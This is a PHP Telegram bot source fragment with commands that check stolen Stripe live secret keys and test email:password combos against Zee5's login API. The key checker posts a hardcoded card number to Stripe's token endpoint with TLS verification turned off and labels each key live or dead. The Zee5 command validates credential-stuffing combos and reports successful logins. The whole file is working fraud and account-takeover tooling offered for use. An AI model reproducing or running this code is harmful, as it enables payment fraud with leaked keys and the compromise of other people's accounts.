sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣『 ★ LIVE 𝐊𝐄𝐘 ✅ ★ 』</b>%0A<u>╟➣ 𝐊𝐄𝐘 ➣</u> <code>$skhidden</code>%0A<u>╟➣ 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ➣</u> 𝐒𝐊 𝐋𝐈𝐕𝐄!!%0A<u>╟➣ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➣ </u> @$usernam%0A<b>╟➣ 𝐁𝐨𝐭 𝐁𝐲 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);
}
elseif (strpos($result, 'Invalid API Key provided')){
sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟『 ★ 𝐃𝐄𝐀𝐃 𝐊𝐄𝐘 ❌ ★ 』</b>%0A<u>╟➣ 𝐊𝐄𝐘 ➣</u> <code>$sec</code>%0A<u>╟➣ 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ➣</u> 𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐊𝐄𝐘%0A<u>╟➣ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➣ </u> @$usernam%0A<b>╟➣ 𝐁𝐨𝐭 𝐁𝐲 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);
}
elseif (strpos($result, 'You did not provide an API key.')){
sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟『 ★ 𝐃𝐄𝐀𝐃 𝐊𝐄𝐘 ❌ ★ 』</b>%0A<u>╟➣ 𝐊𝐄𝐘 ➣</u> <code>$sec</code>%0A<u>╟➣ 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ➣</u> 𝐍𝐨 𝐒K 𝐊𝐞𝐲 𝐏𝐫𝐨𝐯𝐢𝐝𝐞𝐝%0A<u>╟➣ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➣ </u> @$usernam%0A<b>╟➣ 𝐁𝐨𝐭 𝐁𝐲 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);
}
elseif (strpos($result, 'rate_limit')){
sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟『 ★ 𝐃𝐄𝐀𝐃 𝐊𝐄𝐘 ⚠️ ★ 』</b>%0A<u>╟➣ 𝐊𝐄𝐘 ➣</u> <code>$sec</code>%0A<u>╟➣ 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ➣</u> 𝐑𝐚𝐭𝐞 𝐋𝐢𝐦𝐢𝐭𝐞𝐝 𝐊𝐞𝐲%0A<u>╟➣ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➣ </u> @$usernam%0A<b>╟➣ 𝐁𝐨𝐭 𝐁𝐲 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);
}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟『 ★ 𝐃𝐄𝐀𝐃 𝐊𝐄𝐘 ❌ ★ 』</b>%0A<u>╟➣ 𝐊𝐄𝐘 ➣</u> <code>$sec</code>%0A<u>╟➣ 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ➣</u> 𝐓𝐞𝐬𝐭𝐦𝐨𝐝𝐞 𝐂𝐡𝐚𝐫𝐠𝐞𝐬 𝐎𝐧𝐥𝐲%0A<u>╟➣ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➣ </u> @$usernam%0A<b>╟➣ 𝐁𝐨𝐭 𝐁𝐲 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);
}
elseif (strpos($result, 'api_key_expired')){
sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟『 ★ 𝐃𝐄𝐀𝐃 𝐊𝐄𝐘 ❌ ★ 』</b>%0A<u>╟➣ 𝐊𝐄𝐘 ➣</u> <code>$sec</code>%0A<u>╟➣ 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ➣</u> 𝐀𝐩𝐢 𝐊𝐞𝐲 𝐄𝐱𝐩𝐢𝐫𝐞𝐝%0A<u>╟➣ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➣ </u> @$usernam%0A<b>╟➣ 𝐁𝐨𝐭 𝐁𝐲 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);
}
else{
sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟『 ★ 𝐃𝐄𝐀𝐃 𝐊𝐄𝐘 ❌ ★ 』</b>%0A<u>╟➣ 𝐊𝐄𝐘 ➣</u> <code>$skhidden</code>%0A<u>╟➣ 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ➣</u> Unknown Error.%0A<u>╟➣ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➣ </u> @$usernam%0A<b>╟➣ 𝐁𝐨𝐭 𝐁𝐲 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);
}
}
else {
sendMessage($chatId, '<b>%0A╔══════════════════════════%0A╟『 ★ 𝐍𝐨 𝐒𝐤 𝐏𝐫𝐨𝐯𝐢𝐝𝐞𝐝 ❌ ★ 』%0AFormat - /key sk_live_xxx</b>', $message_id);
}
delMessage($chatId, $message_id);
;}
elseif (strpos($message, "/sk") === 0){
$sec = substr($message, 4);
if (!empty($sec)) {
$skhidden = substr_replace($sec, '',12).preg_replace("/(?!^).(?!$)/", "x", substr($sec, 12));
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]=4912461004526326&card[exp_month]=04&card[exp_year]=2024&card[cvc]=011');
$result = curl_exec($ch);
$response = trim(strip_tags(GetStr($result,'"message": "','"')));
if (strpos($result, 'tok_')){
sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟『 ★ LIVE 𝐊𝐄𝐘 ✅ ★ 』✅ LIVE 𝐊𝐄𝐘</b>%0A<u>╟➣ 𝐊𝐄𝐘 ➣</u> <code>$skhidden</code>%0A<u>╟➣ 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ➣</u> 𝐒𝐊 𝐋𝐈𝐕𝐄!!%0A<u>╟➣ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➣ </u> @$usernam%0A<b>╟➣ 𝐁𝐨𝐭 𝐁𝐲 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);
}
elseif (strpos($result, 'Invalid API Key provided')){
sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟『 ★ 𝐃𝐄𝐀𝐃 𝐊𝐄𝐘 ❌ ★ 』❌ 𝐃𝐄𝐀𝐃 𝐊𝐄𝐘</b>%0A<u>╟➣ 𝐊𝐄𝐘 ➣</u> <code>$sec</code>%0A<u>╟➣ 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ➣</u> 𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐊𝐄𝐘%0A<u>╟➣ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➣ </u> @$usernam%0A<b>╟➣ 𝐁𝐨𝐭 𝐁𝐲 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);
}
elseif (strpos($result, 'You did not provide an API key.')){
sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟『 ★ 𝐃𝐄𝐀𝐃 𝐊𝐄𝐘 ❌ ★ 』</b>%0A<u>╟➣ 𝐊𝐄𝐘 ➣</u> <code>$sec</code>%0A<u>╟➣ 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ➣</u> 𝐍𝐨 𝐒K 𝐊𝐞𝐲 𝐏𝐫𝐨𝐯𝐢𝐝𝐞𝐝%0A<u>╟➣ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➣ </u> @$usernam%0A<b>╟➣ 𝐁𝐨𝐭 𝐁𝐲 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);
}
elseif (strpos($result, 'rate_limit')){
sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟『 ★ 𝐃𝐄𝐀𝐃 𝐊𝐄𝐘 ⚠️ ★ 』 </b>%0A<u>╟➣ 𝐊𝐄𝐘 ➣</u> <code>$sec</code>%0A<u>╟➣ 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ➣</u> 𝐑𝐚𝐭𝐞 𝐋𝐢𝐦𝐢𝐭𝐞𝐝 𝐊𝐞𝐲%0A<u>╟➣ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➣ </u> @$usernam%0A<b>╟➣ 𝐁𝐨𝐭 𝐁𝐲 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);
}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟『 ★ 𝐃𝐄𝐀𝐃 𝐊𝐄𝐘 ❌ ★ 』</b>%0A<u>╟➣ 𝐊𝐄𝐘 ➣</u> <code>$sec</code>%0A<u>╟➣ 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ➣</u> 𝐓𝐞𝐬𝐭𝐦𝐨𝐝𝐞 𝐂𝐡𝐚𝐫𝐠𝐞𝐬 𝐎𝐧𝐥𝐲%0A<u>╟➣ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➣ </u> @$usernam%0A<b>╟➣ 𝐁𝐨𝐭 𝐁𝐲 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);
}
elseif (strpos($result, 'api_key_expired')){
sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟『 ★ 𝐃𝐄𝐀𝐃 𝐊𝐄𝐘 ❌ ★ 』</b>%0A<u>╟➣ 𝐊𝐄𝐘 ➣</u> <code>$sec</code>%0A<u>╟➣ 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ➣</u> 𝐀𝐩𝐢 𝐊𝐞𝐲 𝐄𝐱𝐩𝐢𝐫𝐞𝐝%0A<u>╟➣ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➣ </u> @$usernam%0A<b>╟➣ 𝐁𝐨𝐭 𝐁𝐲 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);
}
else{
sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟『 ★ 𝐃𝐄𝐀𝐃 𝐊𝐄𝐘 ❌ ★ 』 </b>%0A<u>╟➣ 𝐊𝐄𝐘 ➣</u> <code>$skhidden</code>%0A<u>╟➣ 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ➣</u> Unknown Error.%0A<u>╟➣ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➣ </u> @$usernam%0A<b>╟➣ 𝐁𝐨𝐭 𝐁𝐲 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);
}
}
else {
sendMessage($chatId, '<b>%0A╔═══════════════════%0A╟『 ★ 𝐍𝐨 𝐒𝐤 𝐏𝐫𝐨𝐯𝐢𝐝𝐞𝐝 ❌ ★ 』%0AFormat - /sk sk_live_xxxxxxxxxxx</b>', $message_id);
}
delMessage($chatId, $message_id);
;}

//////////=========[Zee5 Command]=========//////////

elseif (strpos($message, "/zee5") === 0){
$combo = substr($message, 6);
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('Asia/Kolkata');
$date1 = date('yy-m-d');
function multiexplode($delimiters, $string){
$one = str_replace($delimiters, $delimiters[0], $string);
$two = explode($delimiters[0], $one);
return $two;
};
$email = multiexplode(array(":", "|", ""), $combo)[0];
$pass = multiexplode(array(":", "|", ""), $combo)[1];
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
};
    
///////////////////////===========[Login Check]============/////////////////////
    
$resultmann = file_get_contents('https://userapi.zee5.com/v1/user/loginemail?email='.$email.'&password='.$pass.'');
$token = trim(strip_tags(GetStr($resultmann,'{"token":"','"}')));
    
/////////////////===============[Result]===========///////////////////
    
if($token){
sendMessage($chatId, "<b>ZEE5 Account-»</b>%0A<b>⋆Combo-»</b> <code>$combo</code>%0A<b>⋆Response-»</b> <b>Successfully Logged in</b>%0A<b>⋆Checked By-»</b> @$username%0A%0A<b>⋆Bot by --»【🅽🆃🅼】%0A @abdul97233 </b>", $message_id);
}else{
sendMessage($chatId, "<b>⋆Combo-»</b> <code>$combo</code>%0A<b>⋆Response-»</b> <b>Wrong Email or Password</b>%0A<b>⋆Checked By-»</b> @$username%0A%0A<b>⋆Bot by --»【🅽🆃🅼】%0A @abdul97233 </b>", $message_id);
};
curl_close($ch);
ob_flush();
}
   
////////////////////////////////////////////////////////////////////////////////////////////////

function sendMessage ($chatId, $message, $message_id){
$url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
file_get_contents($url);
};
function delMessage ($chatId, $message_id){
$url = $GLOBALS[website]."/deleteMessage?chat_id=".$chatId."&message_id=".$message_id."";
file_get_contents($url);
};

function editMessage($chatId, $message, $messageId) {

$url = $GLOBALS[website]."/editMessageText?chat_id=".$chatId."&message_id=".$messageId."&text=".urlencode($message);
file_get_contents($url);

}
?>
